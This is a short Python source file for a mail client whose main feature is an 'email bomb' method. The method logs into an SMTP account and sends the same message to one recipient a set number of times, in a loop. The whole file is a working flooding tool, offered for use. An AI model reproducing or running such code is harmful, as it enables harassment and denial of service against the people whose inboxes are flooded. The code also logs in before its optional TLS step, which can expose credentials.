import smtplib
import time
import getpass
from src.mail_bomb import MailBomb


class MailClient:
    def __init__(self, smtpobj):
        self.smtpobj = smtpobj
        self.email = None
        self.login()


    def login(self):
        # smtpobj is a SMTP object that represents a connection to an SMTP mail server and has methods for sending emails.
        self.email = input("What is your email address ? ")  # take username or input
        my_passw = getpass.getpass('Enter your password:')
        try:
            self.smtpobj.login(self.email, my_passw)
            self.email = self.email
        except smtplib.SMTPAuthenticationError:
            print("The username or password you entered is incorrect.")

    def enable_email_encryption(self, smtp_server):
        if smtp_server == "smtp.gmail.com":
            self.smtpobj.starttls()  # This step enables encryption(TLS Encryption) for your connection.

    def send_email_bomb(self, mail_bomb: MailBomb):
        try:
            for i in range(mail_bomb.times):
                self.smtpobj.sendmail(self.email, mail_bomb.recipient, mail_bomb.message)
                time.sleep(1)
            print(f"Message sent {i + 1} times")
        except Exception as e:
            print(f"Failed to send: {e}")
